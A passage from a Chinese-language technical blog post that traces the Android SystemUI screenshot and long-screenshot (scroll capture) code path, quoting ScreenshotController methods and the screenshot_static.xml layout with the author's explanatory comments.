class="variable">captureArgs</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">SurfaceControl</span>.DisplayCaptureArgs.Builder(displayToken)</span><br><span class="line">                        .setSourceCrop(crop)</span><br><span class="line">                        .setSize(width, height)</span><br><span class="line">                        .build();</span><br><span class="line">        <span class="comment">// 屏幕截图硬件缓存</span></span><br><span class="line">        <span class="keyword">final</span> SurfaceControl.<span class="type">ScreenshotHardwareBuffer</span> <span class="variable">screenshotBuffer</span> <span class="operator">=</span></span><br><span class="line">                SurfaceControl.captureDisplay(captureArgs);</span><br><span class="line">        <span class="comment">// 截图缓存</span></span><br><span class="line">        screenshot = screenshotBuffer == <span class="literal">null</span> ? <span class="literal">null</span> : screenshotBuffer.asBitmap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> screenshot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是捕获图片的过程，里面到底如何捕获的。这点我目前还没弄清。<br>接着拿到截屏的 Bitmap 后就可以进行图片保存，显示等等一些操作。<br>接着看 <strong>ScreenshotController#saveScreenshot()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenshot/ScreenshotController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">saveScreenshot</span><span class="params">(Bitmap screenshot, Consumer&lt;Uri&gt; finisher, Rect screenRect,</span></span><br><span class="line"><span class="params">        Insets screenInsets, ComponentName topComponent, <span class="type">boolean</span> showFlash)</span> &#123;</span><br><span class="line">    withWindowAttached(() -&gt;</span><br><span class="line">            mScreenshotView.announceForAccessibility(</span><br><span class="line">                    mContext.getResources().getString(R.string.screenshot_saving_title)));</span><br><span class="line">    <span class="comment">// 判断缩略图的那个窗口是否已附加上去了。</span></span><br><span class="line">    <span class="comment">// ScreenshotView ：附件窗口的布局；有：略缩图，编辑按钮、长截屏按钮等一些其他布局。</span></span><br><span class="line">    <span class="keyword">if</span> (mScreenshotView.isAttachedToWindow()) &#123;</span><br><span class="line">        <span class="comment">// if we didn&#x27;t already dismiss for another reason</span></span><br><span class="line">        <span class="keyword">if</span> (!mScreenshotView.isDismissing()) &#123;</span><br><span class="line">            mUiEventLogger.log(ScreenshotEvent.SCREENSHOT_REENTERED, <span class="number">0</span>, mPackageName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG_WINDOW) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;saveScreenshot: screenshotView is already attached, resetting. &quot;</span></span><br><span class="line">                    + <span class="string">&quot;(dismissing=&quot;</span> + mScreenshotView.isDismissing() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 视图的状态重置，例如：可见性、透明度等。</span></span><br><span class="line">        mScreenshotView.reset();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// 在工作线程中保存屏幕截图。</span></span><br><span class="line">    saveScreenshotInWorkerThread(finisher, <span class="built_in">this</span>::showUiOnActionsReady,</span><br><span class="line">            <span class="built_in">this</span>::showUiOnQuickShareActionReady);</span><br><span class="line">    <span class="comment">// The window is focusable by default</span></span><br><span class="line">    setWindowFocusable(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Wait until this window is attached to request because it is</span></span><br><span class="line">    <span class="comment">// the reference used to locate the target window (below).</span></span><br><span class="line">    <span class="comment">// 这个方法没看明白。</span></span><br><span class="line">    withWindowAttached(() -&gt; &#123;</span><br><span class="line">        <span class="comment">// 请求滚动捕获，捕获长截屏的。</span></span><br><span class="line">        requestScrollCapture();</span><br><span class="line">        mWindow.peekDecorView().getViewRootImpl().setActivityConfigCallback(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ViewRootImpl</span>.ActivityConfigCallback() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onConfigurationChanged</span><span class="params">(Configuration overrideConfig,</span></span><br><span class="line"><span class="params">                            <span class="type">int</span> newDisplayId)</span> &#123;</span><br><span class="line">                                <span class="comment">// 省略部分代码......</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestCompatCameraControl</span><span class="params">(<span class="type">boolean</span> showControl,</span></span><br><span class="line"><span class="params">                            <span class="type">boolean</span> transformationApplied,</span></span><br><span class="line"><span class="params">                            ICompatCameraControlCallback callback)</span> &#123;</span><br><span class="line">                            <span class="comment">// 省略部分代码......</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 创建附加窗口</span></span><br><span class="line">    attachWindow();</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置缩略图，ScreenBitmap 为所截的图片</span></span><br><span class="line">    mScreenshotView.setScreenshot(mScreenBitmap, screenInsets);</span><br><span class="line">    <span class="comment">// 将 ScreenshotView 添加到附加窗口</span></span><br><span class="line">    setContentView(mScreenshotView);</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>截屏布局 <strong>screenshot_static.xml</strong> ：<br><strong>frameworks/base/packages/SystemUI/res/layout/screenshot_static.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.android.systemui.screenshot.DraggableConstraintLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/actions_container_background&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:visibility</span>=<span class="string">&quot;gone&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:elevation</span>=<span class="string">&quot;4dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">&quot;@drawable/action_chip_container_background&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;@dimen/overlay_action_container_margin_horizontal&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;@+id/actions_container&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;@+id/actions_container&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;@+id/actions_container&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 缩略图下方的几个按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">HorizontalScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/actions_container&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">&quot;@dimen/overlay_action_container_margin_horizontal&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">&quot;4dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:paddingEnd</span>=<span class="string">&quot;@dimen/overlay_action_container_padding_right&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:paddingVertical</span>=<span class="string">&quot;@dimen/overlay_action_container_padding_vertical&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:elevation</span>=<span class="string">&quot;4dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:scrollbars</span>=<span class="string">&quot;none&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintWidth_percent</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintWidth_max</span>=<span class="string">&quot;wrap&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toEndOf</span>=<span class="string">&quot;@+id/screenshot_preview_border&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_actions&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/overlay_action_chip&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_share_chip&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/overlay_action_chip&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_edit_chip&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span> <span class="attr">layout</span>=<span class="string">&quot;@layout/overlay_action_chip&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_scroll_chip&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">android:visibility</span>=<span class="string">&quot;gone&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">HorizontalScrollView</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 缩略图边框，使用 android:elevation=&quot;7dp&quot; 属性，确定哪个覆盖在哪个上面，值大的布局显示在上方 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">View</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_preview_border&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">&quot;@dimen/overlay_offset_x&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">&quot;12dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:elevation</span>=<span class="string">&quot;7dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:alpha</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">&quot;@drawable/overlay_border&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;@id/screenshot_preview_end&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;@id/screenshot_preview_top&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- constraintlayout 这种布局方式的，一个属性。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.Barrier</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_preview_end&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:barrierMargin</span>=<span class="string">&quot;@dimen/overlay_border_width&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:barrierDirection</span>=<span class="string">&quot;end&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:constraint_referenced_ids</span>=<span class="string">&quot;screenshot_preview&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.Barrier</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_preview_top&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:barrierDirection</span>=<span class="string">&quot;top&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:barrierMargin</span>=<span class="string">&quot;@dimen/overlay_border_width_neg&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:constraint_referenced_ids</span>=<span class="string">&quot;screenshot_preview&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 缩略图 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_preview&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:visibility</span>=<span class="string">&quot;invisible&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;@dimen/overlay_x_scale&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_margin</span>=<span class="string">&quot;@dimen/overlay_border_width&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:elevation</span>=<span class="string">&quot;7dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:contentDescription</span>=<span class="string">&quot;@string/screenshot_edit_description&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:scaleType</span>=<span class="string">&quot;fitEnd&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">&quot;@drawable/overlay_preview_background&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:adjustViewBounds</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:clickable</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;@id/screenshot_preview_border&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;@id/screenshot_preview_border&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;@id/screenshot_preview_border&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;@id/screenshot_preview_border&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ImageView</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--add by jingtao.guo TFBAAA-2325 添加截图&quot;X&quot;图标--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FrameLayout</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_dismiss_button&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;@dimen/overlay_dismiss_button_tappable_size&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;@dimen/overlay_dismiss_button_tappable_size&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:elevation</span>=<span class="string">&quot;10dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toEndOf</span>=<span class="string">&quot;@id/screenshot_preview&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;@id/screenshot_preview&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;@id/screenshot_preview&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toTopOf</span>=<span class="string">&quot;@id/screenshot_preview&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:contentDescription</span>=<span class="string">&quot;@string/screenshot_dismiss_description&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_dismiss_image&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_margin</span>=<span class="string">&quot;@dimen/overlay_dismiss_button_margin&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:src</span>=<span class="string">&quot;@drawable/overlay_cancel&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/screenshot_scrollable_preview&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:scaleType</span>=<span class="string">&quot;matrix&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:visibility</span>=<span class="string">&quot;gone&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;@id/screenshot_preview&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;@id/screenshot_preview&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:elevation</span>=<span class="string">&quot;7dp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">com.android.systemui.screenshot.DraggableConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>至此，全截屏流程就到此结束，<strong>saveScreenshotInWorkerThread()</strong> 这里不做分析。<br>下面分析长截屏：<br>在上述代码中，有讲到 <strong>requestScrollCapture()</strong> ，请求滚动捕获，即长截屏。<br><strong>ScreenshotController#requestScrollCapture()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenshot/ScreenshotController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">requestScrollCapture</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!allowLongScreenshots()) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Long screenshots not supported on this device&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mScrollCaptureClient.setHostWindowToken(mWindow.getDecorView().getWindowToken());</span><br><span class="line">    <span class="keyword">if</span> (mLastScrollCaptureRequest != <span class="literal">null</span>) &#123;</span><br><span class="line">        mLastScrollCaptureRequest.cancel(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 请求长截图捕获</span></span><br><span class="line">    <span class="keyword">final</span> ListenableFuture&lt;ScrollCaptureResponse&gt; future =</span><br><span class="line">            mScrollCaptureClient.request(DEFAULT_DISPLAY);</span><br><span class="line">    mLastScrollCaptureRequest = future;</span><br><span class="line">    mLastScrollCaptureRequest.addListener(() -&gt;</span><br><span class="line">            onScrollCaptureResponseReady(future), mMainExecutor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>长截图捕获流程： <strong>mScrollCaptureClient.request()</strong> 请求捕获 <strong>→mWindowManagerService.requestScrollCapture()→ViewRootImpl#requestScrollCapture()→ViewRootImpl#handleScrollCaptureRequest()</strong> 处理滚动捕获请求，拿到捕获目标。 <strong>→ViewGroup#dispatchScrollCaptureSearch()</strong> 通过检查此视图，处理滚动捕获搜索请求，然后检查每个子视图。该隐藏的隐藏，设置视图偏移等等。</p></blockquote><p>走完上述流程，才会继续往下执行；<br>接着看 <strong>ScreenshotController#onScrollCaptureResponseReady()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenshot/ScreenshotController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">onScrollCaptureResponseReady</span><span class="params">(Future&lt;ScrollCaptureResponse&gt; responseFuture)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 上次滚动捕获响应</span></span><br><span class="line">        <span class="keyword">if</span> (mLastScrollCaptureResponse != <span class="literal">null</span>) &#123;</span><br><span class="line">            mLastScrollCaptureResponse.close();</span><br><span class="line">            mLastScrollCaptureResponse = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 长截屏响应，这和 网络请求中，响应头类似， response 里有很多的数据。</span></span><br><span class="line">        <span class="keyword">if</span> (responseFuture != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (responseFuture.isCancelled()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将本次滚动捕获响应 设置成 滚动捕获响应</span></span><br><span class="line">            mLastScrollCaptureResponse = responseFuture.get();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;onScrollCaptureResponseReady responseFuture is null!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (mLastScrollCaptureResponse != <span class="literal">null</span> &amp;&amp; 